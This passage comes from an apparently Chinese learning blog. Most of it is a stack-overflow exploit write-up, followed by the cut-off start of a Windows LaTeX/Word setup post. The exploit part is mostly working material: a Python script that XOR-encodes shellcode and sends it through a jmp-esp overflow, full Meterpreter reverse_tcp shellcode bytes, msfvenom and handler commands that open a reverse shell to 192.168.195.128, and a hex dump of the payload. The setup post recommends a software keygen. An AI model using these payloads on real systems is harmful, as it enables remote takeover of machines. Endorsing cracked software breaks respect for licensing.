 <span class="keyword">if</span> shellcodeLength &gt; <span class="number">0xffff</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;payload 的长度太长了 (我还没研究太长会怎么样)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> key &lt;= <span class="number">0xff</span>, <span class="string">&quot;key 太长了 (这种简单的编码方法不适用于这个 payload)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    lenNeedDecode = <span class="built_in">bytes</span>([shellcodeLength % <span class="number">256</span>]) + <span class="built_in">bytes</span>([shellcodeLength//<span class="number">256</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> lenNeedDecode[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">or</span> lenNeedDecode[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">r&quot;decode 函数中有 &#x27;\x00&#x27; 请检查长度&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码函数的编码后 code</span></span><br><span class="line">    decode_code = <span class="string">b&#x27;\xEB\x10\x5A\x4A\x33\xC9\x66\xB9&#x27;</span> + lenNeedDecode + <span class="string">b&#x27;\x80\x34\x0A&#x27;</span> + <span class="built_in">bytes</span>([key]) + <span class="string">b&#x27;\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decode_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    s shellcode 机器码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ans = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    key = <span class="number">0x01</span></span><br><span class="line">    <span class="keyword">while</span> key &lt;= <span class="number">0xff</span>:</span><br><span class="line">        temp = <span class="number">0x01</span></span><br><span class="line">        x = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            temp = i ^ key</span><br><span class="line">            x.append(temp)</span><br><span class="line">            <span class="keyword">if</span> temp == <span class="number">0x00</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> temp == <span class="number">0x00</span>:</span><br><span class="line">            key += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">                ans += <span class="built_in">bytes</span>([i]) <span class="comment"># int to bytes</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> key, ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 未 encode 的计算器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noEncodeCalc</span>():</span></span><br><span class="line">    </span><br><span class="line">    shellcode = <span class="string">b&#x27;\x55\x8B\xEC\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8B\xC4\x6A\x05\x50\xB8\xAD\x23\x86\x7C\xFF\xD0\x33\xC0\x50\xB8\xFA\xCA\x81\x7C\xFF\xD0\x8B\xE5\x5D\x33&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload = offset + jmp_esp + shellcode</span><br><span class="line"></span><br><span class="line">    sendPayload(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># encode 的 计算器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeCalc</span>():</span></span><br><span class="line">    </span><br><span class="line">    s = <span class="string">b&#x27;\x55\x8B\xEC\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8B\xC4\x6A\x05\x50\xB8\xAD\x23\x86\x7C\xFF\xD0\x33\xC0\x50\xB8\xFA\xCA\x81\x7C\xFF\xD0\x8B\xE5\x5D\x33&#x27;</span></span><br><span class="line">    encodeShellcode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 msf 的框架</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">useMSF</span>():</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用 msf 的 </span></span><br><span class="line"><span class="string">    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.195.128 lport=8964 &gt; apu2.bin </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    来生成一个shellcode</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># shellcode = b&#x27;\xFC\xE8\x8F\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x31\xFF\x0F\xB7\x4A\x26\x8B\x72\x28\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x57\x85\xC0\x74\x4C\x01\xD0\x8B\x58\x20\x8B\x48\x18\x50\x01\xD3\x85\xC9\x74\x3C\x31\xFF\x49\x8B\x34\x8B\x01\xD6\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x75\xE0\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xE9\x80\xFF\xFF\xFF\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\x89\xE8\xFF\xD0\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x0A\x68\xC0\xA8\xC3\x80\x68\x02\x00\x23\x04\x89\xE6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0A\xFF\x4E\x08\x75\xEC\xE8\x67\x00\x00\x00\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7E\x36\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7D\x28\x58\x68\x00\x40\x00\x00\x6A\x00\x50\x68\x0B\x2F\x0F\x30\xFF\xD5\x57\x68\x75\x6E\x4D\x61\xFF\xD5\x5E\x5E\xFF\x0C\x24\x0F\x85\x70\xFF\xFF\xFF\xE9\x9B\xFF\xFF\xFF\x01\xC3\x29\xC6\x75\xC1\xC3\xBB\xF0\xB5\xA2\x56\x6A\x00\x53\xFF\xD5&#x27;</span></span><br><span class="line">    shellcode = <span class="string">b&#x27;\xFC\xE8\x8F\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x0F\xB7\x4A\x26\x31\xFF\x8B\x72\x28\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x8B\x52\x10\x57\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4C\x01\xD0\x8B\x58\x20\x50\x01\xD3\x8B\x48\x18\x85\xC9\x74\x3C\x49\x8B\x34\x8B\x31\xFF\x01\xD6\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x75\xE0\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xE9\x80\xFF\xFF\xFF\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\x89\xE8\xFF\xD0\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x0A\x68\xC0\xA8\xC3\x80\x68\x02\x00\x23\x04\x89\xE6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0A\xFF\x4E\x08\x75\xEC\xE8\x67\x00\x00\x00\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7E\x36\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7D\x28\x58\x68\x00\x40\x00\x00\x6A\x00\x50\x68\x0B\x2F\x0F\x30\xFF\xD5\x57\x68\x75\x6E\x4D\x61\xFF\xD5\x5E\x5E\xFF\x0C\x24\x0F\x85\x70\xFF\xFF\xFF\xE9\x9B\xFF\xFF\xFF\x01\xC3\x29\xC6\x75\xC1\xC3\xBB\xF0\xB5\xA2\x56\x6A\x00\x53\xFF\xD5&#x27;</span></span><br><span class="line">    </span><br><span class="line">    encodeShellcode(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 弹出一个计算器 使用未编码 shellcode</span></span><br><span class="line">    <span class="comment"># noEncodeCalc()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># # 弹出一个计算器 使用简单编码的 shellcode</span></span><br><span class="line">    <span class="comment"># encodeCalc()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 msf 的 payload</span></span><br><span class="line">    useMSF()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>find_JMP_ESP.cpp</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nRetCode=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">bool</span> we_load_it=<span class="literal">false</span>;</span><br><span class="line">	HINSTANCE h;</span><br><span class="line">	TCHAR dllname[]=_T(<span class="string">&quot;kernel32&quot;</span>);       </span><br><span class="line">	h=GetModuleHandle(dllname);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(h==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		h=LoadLibrary(dllname);</span><br><span class="line">		<span class="keyword">if</span>(h==<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;dllname&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		we_load_it=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE* ptr=(BYTE*)h;</span><br><span class="line">	<span class="keyword">bool</span> done=<span class="literal">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> y=<span class="number">0</span>;!done;y++)&#123;</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(ptr[y]==<span class="number">0xFF</span>&amp;&amp;ptr[y+<span class="number">1</span>]==<span class="number">0xE4</span>)&#123;</span><br><span class="line">				<span class="keyword">int</span> pos=(<span class="keyword">int</span>)ptr+y;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(...)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;END OF&quot;</span>&lt;&lt;dllname&lt;&lt;<span class="string">&quot;MEMORY REACHED&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			done=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(we_load_it)</span><br><span class="line">		FreeLibrary(h);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> nRetCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>decode_asm.cpp</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">		jmp decode_end </span><br><span class="line">		decode_start:</span><br><span class="line">		pop edx </span><br><span class="line">		dec edx</span><br><span class="line">		<span class="keyword">xor</span> ecx,ecx</span><br><span class="line">		mov cx,<span class="number">0x300</span> </span><br><span class="line">		decode_loop:</span><br><span class="line">		<span class="keyword">xor</span> byte ptr [edx+ecx], <span class="number">0x1</span> </span><br><span class="line">		loop decode_loop </span><br><span class="line">		jmp decode_ok </span><br><span class="line">		decode_end:</span><br><span class="line">		call decode_start</span><br><span class="line">		decode_ok: </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>msf command</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成 shellcode</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.195.128 lport=8964 -k &gt; apu4.bin </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启监听</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开 msf</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 handler</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置类型</span></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置监听ip</span></span><br><span class="line">set lhost 192.168.195.128</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置监听端口</span></span><br><span class="line">set lport 8964</span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><code>randstr.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">seed = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">sa = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">700</span>):</span><br><span class="line">    sa.append(random.choice(seed))</span><br><span class="line">salt = <span class="string">&#x27;&#x27;</span>.join(sa)</span><br><span class="line">print(salt)</span><br></pre></td></tr></table></figure>
<p><code>apu4.bin</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fce8 8f00 0000 6089 e531 d264 8b52 308b</span><br><span class="line">520c 8b52 1431 ff0f b74a 268b 7228 31c0</span><br><span class="line">ac3c 617c 022c 20c1 cf0d 01c7 4975 ef52</span><br><span class="line">8b52 108b 423c 01d0 8b40 7857 85c0 744c</span><br><span class="line">01d0 8b58 208b 4818 5001 d385 c974 3c31</span><br><span class="line">ff49 8b34 8b01 d631 c0ac c1cf 0d01 c738</span><br><span class="line">e075 f403 7df8 3b7d 2475 e058 8b58 2401</span><br><span class="line">d366 8b0c 4b8b 581c 01d3 8b04 8b01 d089</span><br><span class="line">4424 245b 5b61 595a 51ff e058 5f5a 8b12</span><br><span class="line">e980 ffff ff5d 6833 3200 0068 7773 325f</span><br><span class="line">5468 4c77 2607 89e8 ffd0 b890 0100 0029</span><br><span class="line">c454 5068 2980 6b00 ffd5 6a0a 68c0 a8c3</span><br><span class="line">8068 0200 2304 89e6 5050 5050 4050 4050</span><br><span class="line">68ea 0fdf e0ff d597 6a10 5657 6899 a574</span><br><span class="line">61ff d585 c074 0aff 4e08 75ec e867 0000</span><br><span class="line">006a 006a 0456 5768 02d9 c85f ffd5 83f8</span><br><span class="line">007e 368b 366a 4068 0010 0000 566a 0068</span><br><span class="line">58a4 53e5 ffd5 9353 6a00 5653 5768 02d9</span><br><span class="line">c85f ffd5 83f8 007d 2858 6800 4000 006a</span><br><span class="line">0050 680b 2f0f 30ff d557 6875 6e4d 61ff</span><br><span class="line">d55e 5eff 0c24 0f85 70ff ffff e99b ffff</span><br><span class="line">ff01 c329 c675 c1c3 bbf0 b5a2 566a 0053</span><br><span class="line">ffd5 </span><br></pre></td></tr></table></figure>


<h1 id="0x05-实验总结"><a href="#0x05-实验总结" class="headerlink" title="0x05 实验总结"></a>0x05 实验总结</h1><p>本次实验想尽量从最底层出发实现这个攻击，因此写的篇幅较大。本来反弹的shellcode都想手动编译实现，但有些太麻烦最终就放弃了。本次实验本来是入门级的，基于现成的工具 <code>msf</code> 可以一键搞定，从找到溢出点到生成shellcode到编码到拿到shell一键搞定。同时也可以结合 <code>pwntools</code> 两键搞定。但还是本着学习过程的思想，写了这篇博客。</p>
<p><strong>最后，请勿在未授权的情况下，进行任何的尝试。</strong></p>
<p><strong>谨以此，备忘。</strong></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>jmp esp： <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41683305/article/details/104303554">https://blog.csdn.net/qq_41683305/article/details/104303554</a></p>
<p>计算器 shellcode： <a target="_blank" rel="noopener" href="https://www.daimajiaoliu.com/daima/4ed57f7c5100407">https://www.daimajiaoliu.com/daima/4ed57f7c5100407</a></p>
<p>msf：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/clever-universe/p/8691365.html">https://www.cnblogs.com/clever-universe/p/8691365.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/11/12/pwn%E7%9A%84%E5%88%9D%E4%BD%93%E9%AA%8C/" data-id="ckja3vkqx002o14lnda91gf34" data-title="pwd的初体验" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-latex配置" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/09/15/latex%E9%85%8D%E7%BD%AE/" class="article-date">
  <time class="dt-published" datetime="2020-09-15T07:21:32.000Z" itemprop="datePublished">2020-09-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/09/15/latex%E9%85%8D%E7%BD%AE/">Windows 下 latex 配置</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Windows-下latex的配置（word插件-独立编译pdf）"><a href="#Windows-下latex的配置（word插件-独立编译pdf）" class="headerlink" title="Windows 下latex的配置（word插件+独立编译pdf）"></a>Windows 下latex的配置（word插件+独立编译pdf）</h1><blockquote>
<p>latex是干啥的呢？帕拉帕拉一堆，随便搜索一下就好啦，这里只讲怎么配置好和怎么用。</p>
</blockquote>
<h2 id="0x01-word插件"><a href="#0x01-word插件" class="headerlink" title="0x01 word插件"></a>0x01 word插件</h2><p>下载 aurora： <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dGgMELX2sRngxhdzj3wtuA">链接1</a>，提取码：ms6q  （PS：来源于参考链接1）</p>
<p>下载miktex，<a target="_blank" rel="noopener" href="https://miktex.org/download">官网链接</a>。</p>
<p>由于它很久很久没更新了，所以需要把系统时间调回2009年来进行安装，然后运行成功一次之后，就可以把系统的时间调整回来了。</p>
<p>下载的文件包含了安装包和注册机，注册机随便输入点英文字母就可以进行注册了。</p>
<p>随便安装在哪里都可，记住路径就好。<strong>记住先调整时间哈。2009年的某一天</strong> <strong>安装aurora的时候不要勾选默认的miktex，aurora太旧了很久没有更新了，下载出来的也是旧版本的。</strong></p>
<p>然后你<strong>应该</strong>会发现你的word(我这边是office 2019)打开会显示激活失败，而且你还无法进行编辑，也就是word就不能用了。那就没法了，我就只能把时间调整回来了。然后破罐子破摔了。</p>
<p>打开word，在上面应该是有一个aurora的玩意，点击它，最左边有个玩意，再点一下，会弹出来一个玩意。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/ajsdakjshd.png" alt="ajsdakjshd"></p>
<p>对就是下面这个玩意 然后点击这个properties</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/aasdasda.png" alt="aasdasda"></p>
<p>然后配置刚才的安装路径下的path下图是参考。 </p>
<blockquote>
<p>latex,dvipng 和pdflatex都在此文件夹下*<em>C:\Users\moonshine\AppData\Local\Programs\MiKTeX 2.9\miktex\bin\x64</em></p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/iaushdiau.png" alt="iaushdiau"></p>
<p>然后就差不多了，需要的package可以从 MiKTeX 的console中进行下载 下图是一个例子，直接搜索，然后右键就可以安装。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/ilshjdfh.png" alt="ilshjdfh"></p>
<p>然后就可以在word的那个插件中进行编写代码啦 “$$”是可以删除的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/aasdasda.png" alt="aasdasda"></p>
<p>只是注意插件版本的依赖包需要copy到这里，它才可进行识别。</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>[ruled,linesnumbered]&#123;algorithm2e&#125;  </span><br><span class="line"><span class="keyword">\usepackage</span>&#123;amsmath&#125;  </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/zhsdhzs.png" alt="zhsdhzs"></p>
<p>然后输入下面的代码，点击上面的<code>refresh</code> 等他 done，再看看你的word</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;algorithm&#125;[H]  </span><br><span class="line">    <span class="keyword">\caption</span>&#123;Learning algorithm of R2P&#125; </span><br><span class="line"><span class="keyword">\begin</span>&#123;algorithmic&#125;[1] </span><br><span class="line">    <span class="keyword">\label</span>&#123;alg:r2p&#125;  </span><br><span class="line">    <span class="keyword">\KwIn</span>&#123;ratings <span class="built_in">$</span>R<span class="built_in">$</span>, joint demographic representations <span class="built_in">$</span>Y<span class="built_in">$</span>,learning rate <span class="built_in">$</span><span class="keyword">\eta</span><span class="built_in">$</span>,maximum iterative number <span class="built_in">$</span>maxIter<span class="built_in">$</span>, negative sampling number <span class="built_in">$</span>k<span class="built_in">$</span><span class="keyword">\;</span>&#125;  </span><br><span class="line">    <span class="keyword">\KwOut</span>&#123;interaction matrix <span class="built_in">$</span><span class="keyword">\bm</span>&#123;W&#125;<span class="built_in">$</span>, movie vectors <span class="built_in">$</span>V<span class="built_in">$</span><span class="keyword">\;</span>&#125;  </span><br><span class="line">    Initialize <span class="built_in">$</span><span class="keyword">\bm</span>&#123;W&#125;,V<span class="built_in">$</span> randomly<span class="keyword">\;</span>  </span><br><span class="line">    <span class="built_in">$</span>t = 0<span class="built_in">$</span><span class="keyword">\;</span>  </span><br><span class="line">    For convenience, define <span class="built_in">$</span><span class="keyword">\vec</span>&#123;<span class="keyword">\varphi</span>&#125;<span class="built_in">_</span>n = <span class="keyword">\sum</span><span class="built_in">_</span>&#123;m<span class="keyword">\in</span> S<span class="built_in">_</span>n&#125;r<span class="built_in">_</span>&#123;m,n&#125;<span class="keyword">\vec</span>&#123;v&#125;<span class="built_in">_</span>m<span class="built_in">$</span><span class="keyword">\;</span> <span class="comment">%\varphi_n\bm&#123;W&#125;\vec&#123;y&#125;_n  </span></span><br><span class="line">    <span class="keyword">\While</span>&#123;not converged 